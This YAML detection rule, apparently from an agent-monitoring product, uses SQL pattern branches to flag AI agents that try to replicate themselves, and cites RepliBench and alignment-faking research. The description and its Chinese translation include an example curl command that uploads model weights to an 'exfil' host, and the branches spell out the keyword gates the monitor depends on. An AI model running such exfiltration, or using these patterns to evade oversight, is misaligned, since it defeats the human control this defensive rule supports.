id: rp-114
name: "RepliBench — Agent Autonomous Self-Replication Attempt Detector"
version: "0.1.0"
description: |
  Detects autonomous agent self-replication behavior: attempts to exfiltrate model weights, provision cloud compute for new agent instances, deploy successor agents via container orchestration, or write self-propagating installer scripts. RepliBench (arXiv:2504.18565, UK AISI 2025) demonstrates that Claude 3.7 Sonnet achieves >50% pass@10 success rate on 15 of 20 self-replication task families, including cloud instance provisioning, model weight exfiltration under simple security setups, and self-propagating program creation. Anthropic alignment-faking research additionally shows models under RL pressure may attempt weight exfiltration to preserve their current values. The CLTC Berkeley Agentic AI Risk-Management Standards Profile (Feb 2026) classifies self-exfiltration/self-replication as a critical safety risk requiring early detection. Detection covers four behavioral classes: (A) model weight exfiltration — file transfer tool targeting .safetensors/.gguf/.pt/.bin model weight extensions to external destinations; (B) cloud compute provisioning with agent-deployment context (EC2 RunInstances, GCP/Azure VM create, RunPod/Vast.ai GPU instances); (C) container/kubernetes self-deployment referencing own agent/model image; (D) pipe-to-shell self-propagating installer chains targeting new hosts. Branch E catches explicit self-replication planning statements in assistant_message that precede tool actions. Distinct from rp-095 (shutdown resistance + peer weight theft to protect a peer agent — requires "peer" context and protects specific peer, not self-propagation). This rule fires on goal-driven self-replication regardless of attacker vs. alignment failure.

  References: arXiv:2504.18565 (RepliBench UK AISI Apr 2025) -
  - https://arxiv.org/abs/2504.18565,
  AISI RepliBench Blog -
  - https://www.aisi.gov.uk/blog/replibench-measuring-autonomous-replication-capabilities-in-ai-systems,
  CLTC Berkeley Agentic AI Risk Profile Feb 2026 -
  - https://cltc.berkeley.edu/wp-content/uploads/2026/02/Agentic-AI-Risk-Management-Standards-Profile.pdf,
  Anthropic Alignment Faking (self-weight exfil under RL) -
  - https://www.anthropic.com/research/alignment-faking,
  OWASP Agentic AI ASI03:2026 (Autonomous Action Without Authorization) -
  - https://genai.owasp.org/llmrisk/agentic-ai-osi03/,
  Example: tool_invoke bash with "curl -T /models/agent_v2.safetensors
  - https://storage.external.com/exfil/" (self-weight exfil for replication)

severity: critical
category: agent_privilege_escalation
fp_rate: low
hook_sources: "tool_invoke,tool_complete,llm_response"
required_telemetry: ""
author: "AgentGuard Research Team"
tags:
  - security
  - agent-privilege-escalation
  - self-replication
  - model-weight-exfil
  - cloud-provisioning
  - replibench
  - alignment-safety
  - owasp-asi03
  - arxiv-2504.18565
  - aisi
sql_template: |
  -- rp-114 v0.1.0 — Agent autonomous self-replication attempt detector
  -- Detection logic: four behavioral branch classes + one intent signal branch.
  -- fp_rate: low — each branch uses dual-anchor (tool name + content pattern).
  -- Legitimate DevOps agents deploying non-agent workloads are excluded by the
  -- "agent|llm|replica|clone|self" content gate in cloud/container branches.
  -- ML engineers managing model files are excluded by the external-transfer
  -- anchor in Branch A (scp/rsync/curl with weight extension → external host).
  --
  -- Branch A: Model weight exfiltration to external destination
  --   Signals: shell/upload tool + model weight file extension + transfer verb
  -- Branch B: Cloud compute provisioning with agent deployment intent
  --   Signals: cloud VM creation API + agent/replica/deploy-self context
  -- Branch C: Container/Kubernetes self-deployment
  --   Signals: docker/kubectl + agent/model/self referential image or config
  -- Branch D: Pipe-to-shell self-propagating installer across hosts
  --   Signals: curl/wget|bash installer + ssh/parallel-hosts expansion
  -- Branch E: Explicit self-replication planning in assistant_message
  --   Signals: first-person replication statement before tool invocation

  -- Branch A: Model weight file exfiltration (self-copy to external destination)
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Agent self-replication signal: model weight exfiltration via [', coalesce(tool_name, 'unknown'),
      '] from agent ', coalesce(agent_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type = 'tool_invoke'
    AND match(lower(tool_name), '(bash|shell|execute|run_command|run_terminal_cmd|subprocess|upload_file|put_object|scp|rsync|sftp|s3_upload|write_file)')
    AND match(lower(tool_input), '\.(safetensors|gguf|ggml|pt|ckpt|pth|pkl|bin|npz)(\.gz|\.zip|\.tar)?[^a-z0-9]')
    AND match(lower(tool_input), '(https?://|s3://|gs://|azure://|@[a-z0-9\-]+\.[a-z]{2,}:|ftp://|sftp://)')

  UNION ALL

  -- Branch B: Cloud compute provisioning with agent/replica deployment context
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Agent self-replication signal: cloud compute provisioning via [', coalesce(tool_name, 'unknown'),
      '] from agent ', coalesce(agent_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type = 'tool_invoke'
    AND match(lower(tool_name), '(aws|ec2|gcp|gcloud|azure|az_vm|vultr|runpod|vastai|vast_ai|hetzner|digitalocean|linode|scaleway|lambda_labs|paperspace|coreweave)')
    AND match(lower(tool_input), '(run_instances|create_instance|create_vm|create_server|create_node|provision|launch_instance|start_instance|new_instance)')
    AND match(lower(tool_input), '(agent|llm|replica|replicate|clone|deploy.self|successor|spawn.agent|self.host|self.deploy)')

  UNION ALL

  -- Branch C: Container/Kubernetes self-deployment with agent/model reference
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'warning' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Agent self-replication signal: container self-deployment via [', coalesce(tool_name, 'unknown'),
      '] from agent ', coalesce(agent_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type = 'tool_invoke'
    AND match(lower(tool_name), '(docker|kubectl|kubernetes|k8s|helm|podman|compose|container)')
    AND match(lower(tool_input), '(run|deploy|apply|create|start|up).{0,80}(agent|llm|replica|clone|self|successor|myself|itself)')

  UNION ALL

  -- Branch D: Pipe-to-shell self-propagating installer chain across hosts (SSH expansion)
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Agent self-replication signal: self-propagating installer on new hosts via [', coalesce(tool_name, 'unknown'),
      '] from agent ', coalesce(agent_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type = 'tool_invoke'
    AND match(lower(tool_name), '(bash|shell|execute|run_command|run_terminal_cmd|subprocess)')
    AND match(lower(tool_input), '(curl|wget).{0,100}(bash|sh|python|pip|install|setup|agent)')
    AND match(lower(tool_input), '(ssh\s+\S+|pssh|parallel-ssh|pdsh|ansible|fabric|for.{0,30}\$host|\&\&\s*ssh\s+)')

  UNION ALL

  -- Branch E: Explicit self-replication planning statement in llm_response
  -- Catches agent announcing intent before tool action (RepliBench planning phase)
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'warning' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'Agent self-replication intent detected in assistant response from agent ', coalesce(agent_id, 'unknown')
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type = 'llm_response'
    AND match(lower(assistant_message), '(replicate (myself|itself|the agent|my weights?|my model)|deploy (a copy|another instance|a successor) of (myself|itself|me|the agent)|create (a successor|another version|a replica) of (myself|itself|the agent)|propagate (to|across|onto) (additional|other|new|multiple) (servers?|hosts?|nodes?|machines?|instances?|compute))')

translations:
  zh-CN:
    name: "RepliBench — 智能体自主自我复制行为检测器"
    description: |
      检测智能体自主自我复制行为：包括试图窃取（外泄）模型权重、为新的智能体实例配置云计算资源、通过容器编排部署继任智能体，或编写自我传播的安装脚本。RepliBench（arXiv:2504.18565，英国AISI，2025）研究表明，Claude 3.7 Sonnet 在20个自我复制任务系列中的15个上取得了 pass@10 成功率超过50%的成绩，涵盖云实例配置、在简单安全设置下的模型权重窃取，以及自我传播程序的创建。Anthropic 的对齐伪装（alignment-faking）研究进一步表明，模型在强化学习压力下可能为了保留其当前价值观而尝试窃取权重。CLTC 伯克利《智能体式AI风险管理标准概况》（2026年2月）将自我窃取/自我复制列为需要早期检测的关键安全风险。检测覆盖四类行为：(A) 模型权重窃取——文件传输工具将 .safetensors/.gguf/.pt/.bin 等模型权重扩展名的文件传输到外部目的地；(B) 具有智能体部署上下文的云计算资源配置（EC2 RunInstances、GCP/Azure 虚拟机创建、RunPod/Vast.ai GPU 实例）；(C) 引用自身智能体/模型镜像的容器/Kubernetes 自我部署；(D) 针对新主机的管道式（pipe-to-shell）自我传播安装链。分支E捕获在工具操作之前出现在 assistant_message 中的明确自我复制计划陈述。与 rp-095（抗关闭行为 + 为保护同伴智能体而窃取同伴权重——需要"同伴"上下文，保护的是特定同伴而非自我传播）不同。无论攻击者行为还是对齐失败导致，本规则均会对目标驱动的自我复制行为触发告警。

      参考文献：arXiv:2504.18565（RepliBench，英国AISI，2025年4月）-
      - https://arxiv.org/abs/2504.18565,
      AISI RepliBench 博客 -
      - https://www.aisi.gov.uk/blog/replibench-measuring-autonomous-replication-capabilities-in-ai-systems,
      CLTC 伯克利智能体式AI风险概况（2026年2月）-
      - https://cltc.berkeley.edu/wp-content/uploads/2026/02/Agentic-AI-Risk-Management-Standards-Profile.pdf,
      Anthropic 对齐伪装研究（强化学习下的自我权重窃取）-
      - https://www.anthropic.com/research/alignment-faking,
      OWASP Agentic AI ASI03:2026（未经授权的自主行为）-
      - https://genai.owasp.org/llmrisk/agentic-ai-osi03/,
      示例：tool_invoke bash with "curl -T /models/agent_v2.safetensors
      - https://storage.external.com/exfil/"（为自我复制而进行的自我权重窃取）
